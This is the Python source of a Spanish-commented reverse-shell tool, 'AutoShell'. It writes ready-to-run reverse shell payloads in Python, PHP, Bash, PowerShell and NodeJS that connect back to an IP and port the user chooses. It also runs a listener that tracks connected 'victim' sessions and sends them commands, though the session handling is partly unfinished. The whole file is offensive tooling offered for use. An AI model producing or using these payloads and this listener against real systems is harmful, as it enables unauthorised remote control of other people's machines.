import os
import socket
import subprocess
import platform
import re
import threading

# Para limpiar pantalla según el sistema
def clear_screen():
    if platform.system() == "Windows":
        os.system("cls")
    else:
        os.system("clear")

# Colores para terminal (en Windows no se verán sin librerías adicionales).
if platform.system() == "Windows":
    RED, GREEN, CYAN, RESET, YELLOW = "", "", "", "", ""
else:
    RED, GREEN, CYAN, RESET, YELLOW = "\033[91m", "\033[92m", "\033[96m", "\033[0m", "\033[93m"

# Variable para almacenar las sesiones activas
# Formato de cada sesión: {
#   "ip": <ip_victima>,
#   "estado": "activo" | "suspendido" | "desconectado",
#   "conn": <objeto_socket>
# }
sessions = {}
session_id_counter = 1  # Contador para IDs de sesión

# Mapeo de estados internos -> texto para mostrar
STATE_MAPPING = {
    "activo": "Conectado",
    "suspendido": "En espera",
    "desconectado": "Desconectado"
}

# Función para mostrar el banner
def banner():
    # Ajusta el espaciado o usa .center() si lo prefieres
    print(f"""
{CYAN}                  
    _       _       ___ _        _ _ 
   /_\ _  _| |_ ___/ __| |_  ___| | |
  / _ \ || |  _/ _ \__ \ ' \/ -_) | |
 /_/ \_\_,_|\__\___/___/_||_\___|_|_|
 ---- By: MARH ----------------------                      

{RESET}                          
""")

# Diccionario de comandos principales
commands = {
    "list sessions": "Lista todas las sesiones activas.",
    "use session <ID>": "Accede a la sesión con el ID especificado.",
    "kill session <ID>": "Elimina la sesión con el ID especificado.",
    "create shell": "Genera una shell reversa especificando IP, puerto y ruta de guardado.",
    "start server": "Inicia el servidor para escuchar conexiones.",
    "help": "Muestra la lista de comandos disponibles.",
    # Nota: Se elimina 'exit' como comando de cierre total de la herramienta.
}

def show_help():
    print(f"\n{CYAN}Comandos disponibles:{RESET}")
    for cmd, desc in commands.items():
        print(f"{GREEN}{cmd}{RESET}: {desc}")
    print()  # Salto de línea final

# Función para validar IP (formato básico 1.1.1.1 - 255.255.255.255)
def validate_ip(ip):
    # Expresión regular: 4 grupos de 1-3 dígitos, 0-255, con puntos
    pattern = r"^(25[0-5]|2[0-4]\d|[01]?\d?\d)\." \
              r"(25[0-5]|2[0-4]\d|[01]?\d?\d)\." \
              r"(25[0-5]|2[0-4]\d|[01]?\d?\d)\." \
              r"(25[0-5]|2[0-4]\d|[01]?\d?\d)$"
    return re.match(pattern, ip)

# Función para validar puerto
def validate_port(port):
    return port.isdigit() and 1 <= int(port) <= 65535

# Plantillas para cada tipo de shell reversa (se reemplazarán {IP} y {PORT})
SHELL_TEMPLATES = {
    "reverse_python.py": """#!/usr/bin/env python3
import socket, subprocess, os

def reverse_shell():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("{IP}", {PORT}))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    subprocess.call(["/bin/bash"])

if __name__ == "__main__":
    reverse_shell()
""",
    "reverse_php.php": """<?php
$ip = '{IP}';
$port = {PORT};
$sock = fsockopen($ip, $port);
if($sock) {
    exec("/bin/sh -i <&3 >&3 2>&3");
}
?>
""",
    "reverse_bash.sh": """#!/bin/bash
bash -i >& /dev/tcp/{IP}/{PORT} 0>&1
""",
    "reverse_powershell.ps1": """# Reverse PowerShell
$client = New-Object System.Net.Sockets.TCPClient("{IP}",{PORT})
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)
    $sendback = (iex $data 2>&1 | Out-String )
    $sendback2  = $sendback + "PS " + (pwd).Path + "> "
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
""",
    "reverse_node.js": """(function(){
    var net = require("net");
    var cp = require("child_process");
    var sh = cp.spawn("/bin/sh", []);

    var client = new net.Socket();
    client.connect({PORT}, "{IP}", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Evita que la función lance errores
})();
"""
}

def create_shell():
    print(f"\n{CYAN}== Generar Shell Reversa =={RESET}\n")
    ip = input("IP a la que conectar: ").strip()
    if not validate_ip(ip):
        print(f"{RED}[!] IP inválida. Asegúrate de usar un formato correcto (p. ej. 1.1.1.1).{RESET}\n")
        return

    port = input("Puerto a usar (1-65535): ").strip()
    if not validate_port(port):
        print(f"{RED}[!] Puerto inválido. Debe estar entre 1 y 65535.{RESET}\n")
        return

    print("\nSelecciona el tipo de shell:")
    print(" 1) Python")
    print(" 2) PHP")
    print(" 3) Bash")
    print(" 4) PowerShell")
    print(" 5) NodeJS")
    choice = input("Opción [1-5]: ").strip()

    shell_map = {
        "1": "reverse_python.py",
        "2": "reverse_php.php",
        "3": "reverse_bash.sh",
        "4": "reverse_powershell.ps1",
        "5": "reverse_node.js"
    }

    if choice not in shell_map:
        print(f"{RED}[!] Opción inválida.{RESET}\n")
        return

    shell_name = shell_map[choice]

    # Se pregunta al usuario dónde guardar el archivo (ruta/carpeta)
    print()
    ruta = input("Ruta donde deseas guardar la shell (ej. /home/user/descargas): ").strip()
    if not ruta:
        print(f"{RED}[!] Ruta inválida.{RESET}\n")
        return

    # Crear carpeta si no existe (opcional)
    if not os.path.exists(ruta):
        try:
            os.makedirs(ruta, exist_ok=True)
        except Exception as e:
            print(f"{RED}[!] Error creando la ruta: {e}{RESET}\n")
            return

    shell_path = os.path.join(ruta, shell_name)

    # Generar contenido dinámico
    template = SHELL_TEMPLATES[shell_name]
    content = template.replace("{IP}", ip).replace("{PORT}", port)

    try:
        with open(shell_path, "w") as f:
            f.write(content)
        # Dar permiso de ejecución si es Linux (para .sh, .py, etc.)
        if platform.system() != "Windows":
            if shell_path.endswith(".sh") or shell_path.endswith(".py"):
                os.chmod(shell_path, 0o755)
        print(f"{GREEN}[+] Shell {shell_name} generada en: {shell_path}{RESET}\n")
    except Exception as e:
        print(f"{RED}[!] Error al escribir la shell: {e}{RESET}\n")

def list_sessions():
    print()
    if not sessions:
        print(f"{YELLOW}[!] No hay sesiones activas.{RESET}\n")
        return

    print(f"{CYAN}{'ID':<5} {'IP VICTIMA':<20} {'ESTADO':<15}{RESET}")
    for session_id, session in sessions.items():
        estado_str = STATE_MAPPING.get(session["estado"], "Desconocido")
        print(f"{session_id:<5} {session['ip']:<20} {estado_str:<15}")
    print()

def use_session(session_id):
    """
    Se “usa” la sesión con ID dado.
    Aquí se lanza un loop que simula una shell, mostrando banner,
    y permitiendo volver al menú principal con 'back'.
    """
    if session_id not in sessions:
        print(f"{RED}[!] Sesión {session_id} no encontrada.{RESET}\n")
        return

    # Marcamos la sesión como activa
    sessions[session_id]["estado"] = "activo"

    # Simulación de “shell interactiva”
    clear_screen()
    banner()
    print(f"{YELLOW}[+] Has entrado a la sesión {session_id}. Escribe 'back' para volver al menú principal.{RESET}\n")

    while True:
        cmd = input(f"{CYAN}[Session {session_id}] > {RESET}").strip()
        if not cmd:
            continue
        if cmd.lower() == "back":
            print(f"{CYAN}[*] Volviendo al menú principal...{RESET}\n")
            # Cambiamos el estado a 'suspendido' o 'en espera'
            sessions[session_id]["estado"] = "suspendido"
            break
        if cmd.lower() == "exit":
            # En la shell, 'exit' solo suspende la sesión, NO cierra la herramienta
            print(f"{CYAN}[*] Cerrando interacción con la sesión {session_id}...{RESET}\n")
            sessions[session_id]["estado"] = "suspendido"
            break

        # Aquí iría la lógica de envío de comandos reales si la sesión está conectada
        conn = sessions[session_id].get("conn")
        if conn and sessions[session_id]["estado"] == "activo":
            try:
                conn.send(cmd.encode())
                response = conn.recv(4096).decode()
                print(response)
            except (socket.error, BrokenPipeError):
                print(f"{RED}[!] Se perdió la conexión con la sesión {session_id}.{RESET}")
                sessions[session_id]["estado"] = "desconectado"
                break
        else:
            print(f"{YELLOW}[!] La sesión no está realmente conectada (solo simulación).{RESET}")

def kill_session(session_id):
    if session_id in sessions:
        print(f"{GREEN}[+] Eliminando la sesión {session_id}...{RESET}")
        del sessions[session_id]
        print()
    else:
        print(f"{RED}[!] Sesión {session_id} no encontrada.{RESET}\n")

def handle_connection(conn, addr, session_id):
    """
    Función real que maneja la conexión entrante y crea la sesión
    en un hilo aparte.
    """
    print(f"{GREEN}✅ Conexión recibida de {addr}{RESET}")
    sessions[session_id] = {
        "ip": addr[0],
        "estado": "activo",
        "conn": conn
    }

    # Ejemplo sencillo: mientras la sesión está activa, espera comandos (en un hilo).
    # Nota: esto compite con el input() principal. Habría que manejarlo con una cola
    # o un mecanismo diferente si se quiere total simultaneidad.
    # Aquí haremos un "eco" simple o se podría usar un input() adicional.
    try:
        while True:
            # Podrías implementar lógica de recepción de comandos desde la "use_session".
            # Este ejemplo no implementa un control remoto completo para no mezclar con la shell principal.
            pass
    finally:
        conn.close()
        if session_id in sessions:
            sessions[session_id]["estado"] = "desconectado"

def start_server():
    """
    Inicia un servidor para escuchar conexiones entrantes en host/puerto deseados.
    Limpia pantalla y muestra solo el banner.
    """
    clear_screen()
    banner()

    print(f"{CYAN}== Iniciar Servidor de Escucha =={RESET}\n")
    host = input("Host a escuchar (por defecto 0.0.0.0): ").strip()
    if not host:
        host = "0.0.0.0"
    port_input = input("Puerto a escuchar (por defecto 4444): ").strip()
    if not port_input:
        port = 4444
    else:
        if not validate_port(port_input):
            print(f"{RED}[!] Puerto inválido. Se usará 4444 por defecto.{RESET}\n")
            port = 4444
        else:
            port = int(port_input)

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    try:
        s.bind((host, port))
    except socket.error as e:
        print(f"{RED}[!] Error al iniciar el servidor: {e}{RESET}\n")
        return

    s.listen(5)
    print(f"{GREEN}[+] Servidor escuchando en {host}:{port}{RESET}\n")

    global session_id_counter
    while True:
        try:
            conn, addr = s.accept()
            threading.Thread(
                target=handle_connection,
                args=(conn, addr, session_id_counter),
                daemon=True
            ).start()
            session_id_counter += 1
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Interrupción detectada. Se detiene el servidor.{RESET}\n")
            s.close()
            break

def main():
    clear_screen()
    banner()
    show_help()

    while True:
        cmd = input(f"{CYAN}[AutoShell] > {RESET}").strip().lower()

        if cmd == "list sessions":
            list_sessions()

        elif cmd.startswith("use session "):
            parts = cmd.split()
            if len(parts) == 3:
                try:
                    session_id = int(parts[2])
                    use_session(session_id)
                except ValueError:
                    print(f"{RED}[!] ID de sesión inválido. Debe ser un número entero.{RESET}\n")
            else:
                print(f"{RED}[!] Uso: use session <ID>.{RESET}\n")

        elif cmd.startswith("kill session "):
            parts = cmd.split()
            if len(parts) == 3:
                try:
                    session_id = int(parts[2])
                    kill_session(session_id)
                except ValueError:
                    print(f"{RED}[!] ID de sesión inválido. Debe ser un número entero.{RESET}\n")
            else:
                print(f"{RED}[!] Uso: kill session <ID>.{RESET}\n")

        elif cmd == "create shell":
            create_shell()

        elif cmd == "start server":
            start_server()

        elif cmd == "help":
            show_help()

        elif cmd == "exit":
            # Según la corrección, 'exit' NO debe cerrar la herramienta,
            # solo mostramos un aviso.
            print(f"{YELLOW}[!] El comando 'exit' ya no cierra la herramienta. Use Ctrl+C para salir o cierre la ventana.{RESET}\n")

        elif cmd == "":
            continue

        else:
            print(f"{RED}[!] Comando no reconocido. Escribe 'help' para ver los comandos.{RESET}\n")


if __name__ == "__main__":
    main()
